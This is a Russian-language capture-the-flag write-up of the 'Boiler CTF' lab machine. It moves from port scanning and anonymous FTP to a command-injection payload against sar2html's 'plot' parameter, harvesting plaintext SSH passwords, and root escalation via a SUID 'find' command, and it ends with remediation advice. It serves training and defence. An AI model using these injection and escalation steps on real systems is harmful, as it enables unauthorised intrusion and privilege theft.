# Отчёт о проникновении в инфраструктуру «Boiler CTF»

## 1. Введение

В рамках задания проводилось тестирование на проникновение учебной машины **Boiler CTF**. По условию, это задание среднего уровня: требуется **перечисление** (enumeration) и последовательная эксплуатация найденных сервисов. Цель — получить **пользовательский** и **root** флаги.

В отчёте последовательно описаны **все этапы работы**, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка (Nmap)

Сканирование целевого хоста `10.128.180.227` выявило четыре открытых порта:

```
21/tcp    open  ftp       vsftpd 3.0.5
80/tcp    open  http      Apache httpd
10000/tcp open  miniserv  1.930 (Webmin)
55007/tcp open  ssh       OpenSSH 7.2p2 Ubuntu-4ubuntu2.8
```

**Вывод:**

- **21** — FTP (vsftpd).
- **80** — HTTP (Apache).
- **10000** — Webmin (miniserv 1.930).
- **55007** — SSH (нестандартный порт).


## 3. Анонимный FTP

### 3.1. Проверка анонимного доступа

**Анонимный доступ** — **успешен**. В корне FTP найден файл `.info.txt`:

```
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```

**Содержимое:**

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

**Расшифровка ROT13:**

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

**Вывод:** подсказка — **«Enumeration is the key»**. Нужно **перечислять** всё.


## 4. Ответы на вопросы задания

### 4.1. What is on the highest port?

```
nc 10.128.180.227 55007
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

**Ответ:** **SSH** (OpenSSH 7.2p2).

### 4.2. What's running on port 10000?

**Ответ:** **Webmin** (miniserv 1.930).

### 4.3. What's CMS can you access?

**Перечисление порта 80** (gobuster):

```
.hta                 (Status: 403) [Size: 293]
.htaccess            (Status: 403) [Size: 298]
.htpasswd            (Status: 403) [Size: 298]
index.html           (Status: 200) [Size: 11321]
joomla               (Status: 301) [--> http://10.128.180.227/joomla/]
manual               (Status: 301) [--> http://10.128.180.227/manual/]
robots.txt           (Status: 200) [Size: 257]
server-status        (Status: 403) [Size: 302]
```

**Ответ:** **Joomla**.

### 4.4. The interesting file name in the folder?

**Перечисление `/joomla`:**

```
_test                (Status: 301) [--> http://10.128.180.227/joomla/_test/]
.htaccess            (Status: 403) [Size: 305]
~www                 (Status: 301) [--> http://10.128.180.227/joomla/~www/]
.hta                 (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 305]
administrator        (Status: 301) [--> http://10.128.180.227/joomla/administrator/]
_database            (Status: 301) [--> http://10.128.180.227/joomla/_database/]
bin                  (Status: 301) [--> http://10.128.180.227/joomla/bin/]
_archive             (Status: 301) [--> http://10.128.180.227/joomla/_archive/]
_files               (Status: 301) [--> http://10.128.180.227/joomla/_files/]
build                (Status: 301) [--> http://10.128.180.227/joomla/build/]
cache                (Status: 301) [--> http://10.128.180.227/joomla/cache/]
components           (Status: 301) [--> http://10.128.180.227/joomla/components/]
images               (Status: 301) [--> http://10.128.180.227/joomla/images/]
index.php            (Status: 200) [Size: 12486]
includes             (Status: 301) [--> http://10.128.180.227/joomla/includes/]
installation         (Status: 301) [--> http://10.128.180.227/joomla/installation/]
language             (Status: 301) [--> http://10.128.180.227/joomla/language/]
layouts              (Status: 301) [--> http://10.128.180.227/joomla/layouts/]
libraries            (Status: 301) [--> http://10.128.180.227/joomla/libraries/]
media                (Status: 301) [--> http://10.128.180.227/joomla/media/]
modules              (Status: 301) [--> http://10.128.180.227/joomla/modules/]
plugins              (Status: 301) [--> http://10.128.180.227/joomla/plugins/]
templates            (Status: 301) [--> http://10.128.180.227/joomla/templates/]
tests                (Status: 301) [--> http://10.128.180.227/joomla/tests/]
tmp                  (Status: 301) [--> http://10.128.180.227/joomla/tmp/]
```

**Ответ:** **`_test`** (в нём установлен `sar2html`).


## 5. Robots.txt и скрытые пути

**`/robots.txt`:**

```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
```

**Набор чисел:**

```
079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

**Расшифровка:**

- **From decimal** — числа → ASCII.
- **From base64** — полученная строка → base64.
- **From md5** — полученная строка → MD5.
- **Результат:** **`kidding`**.

**Вывод:** это **отвлекающий манёвр** (`kidding` = «шучу»). **Не** **нужно** **тратить** **на** **это** **время**.


## 6. Эксплуатация `sar2html` (Command Injection)

### 6.1. Обнаружение уязвимости

В директории **`/joomla/_test/`** установлена утилита **`sar2html`**, уязвимая к **Command Injection** через параметр **`plot`**.

**Проверка:**

```bash
curl -s "http://10.128.180.227/joomla/_test/index.php?plot=;ls -la"
```

**Результат:** **выполнение** **команды** `ls -la`.

**Вывод:** **Command Injection** **подтверждён**.

### 6.2. Найден `log.txt`

**В** **той** **же** **директории** **найден** **интересный** **файл** `/log.txt`:

```
sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
```

**Ключевое:**

- **Пользователь:** `basterd`.
- **Пароль:** `superduperp@$$`.

### 6.3. Успешная авторизация по SSH

```bash
ssh basterd@10.128.180.227 -p 55007
# пароль: superduperp@$$
```

**Успешно.**


## 7. Ответы на вопросы (продолжение)

### 7.1. Where was the other users pass stored (no extension, just the name)?

**В** `/home/basterd` **найден** **файл** `backup.sh`.

**Ответ:** **`backup.sh`**.

### 7.2. User flag

**Поиск** `user.txt`:

```bash
find / -type f -name 'user.txt' 2>/dev/null
```

**Файл** **не** **найден** — **значит**, **нужно** **сменить** **пользователя**.

**В** `backup.sh` **найдены** **креды** **для** `stoner`:

```bash
USER=stoner
#superduperp@$$no1knows
```

**Успешное** **подключение** **по** **SSH** **для** `stoner` **и** **чтение** **флага**:

```
You made it till here, well done.
```

**Ответ:** **флаг** **пользователя** `stoner` (**`user.txt`**).


## 8. Эскалация до root

### 8.1. Поиск SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Найден** `/usr/bin/find` **с** **SUID-битом**.

### 8.2. Ответ на вопрос

**What did you exploit to get the privileged user?**

**Ответ:** **`/usr/bin/find`** (**SUID**).

### 8.3. Чтение root-флага

```bash
stoner@Vulnerable:/tmp$ /usr/bin/find /root/root.txt -exec cat {} \;
It wasn't that hard, was it?
```

**Ответ:** **root-флаг** — `It wasn't that hard, was it?`.


## 9. Цепочка атаки

1. **Nmap** → порты 21, 80, 10000, 55007.
2. **FTP** → анонимный доступ → `.info.txt` (ROT13 → «Enumeration is the key»).
3. **Порт 80** → Joomla → `/joomla/_test/` → `sar2html`.
4. **`sar2html`** → **Command Injection** → `log.txt` → **креды** `basterd:superduperp@$$`.
5. **SSH** → `basterd` → `backup.sh` → **креды** `stoner:superduperp@$$no1knows`.
6. **SSH** → `stoner` → **user flag**.
7. **SUID `find`** → `/usr/bin/find /root/root.txt -exec cat {} \;` → **root flag**.


## 10. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| **Анонимный FTP** | Доступ без пароля | Утечка `.info.txt` |
| **Command Injection в `sar2html`** | Параметр `plot` не санитизирован | RCE |
| **Креды в `log.txt`** | Пароль в открытом виде | Компрометация `basterd` |
| **Креды в `backup.sh`** | Пароль в комментарии | Компрометация `stoner` |
| **SUID `find`** | `find` с SUID-битом | Эскалация до root |


## 11. Рекомендации по устранению

1. **Отключить анонимный FTP** — или ограничить доступ.
2. **Обновить `sar2html`** — или удалить.
3. **Не хранить пароли в логах** и скриптах.
4. **Убрать SUID с `find`** — `chmod u-s /usr/bin/find`.
5. **Ограничить права** на `backup.sh` и `log.txt`.
6. **Использовать SSH-ключи** вместо паролей.


## 12. Заключение

Задание пройдено полностью. Цепочка атаки: **анонимный FTP → Joomla → `sar2html` Command Injection → креды в `log.txt` → SSH `basterd` → `backup.sh` → креды `stoner` → user flag → SUID `find` → root flag**. Ключевые ошибки — **Command Injection** в `sar2html`, **пароли в открытом виде** в логах и скриптах, **SUID `find`**. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ → эксплуатация → эскалация → root. Цель достигнута — **оба флага получены**.